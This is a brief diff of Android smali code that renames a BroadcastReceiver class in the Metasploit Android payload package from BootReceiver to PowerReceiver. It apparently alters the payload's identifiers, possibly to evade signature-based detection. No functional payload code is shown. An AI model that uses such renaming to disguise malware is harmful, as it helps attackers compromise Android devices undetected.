@@ -1,6 +1,6 @@
-.class public Lcom/metasploit/stage/BootReceiver;
+.class public Lcom/metasploit/stage/PowerReceiver;
 .super Landroid/content/BroadcastReceiver;
-.source "BootReceiver.java"
+.source "PowerReceiver.java"
 
 .method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
     .locals 2
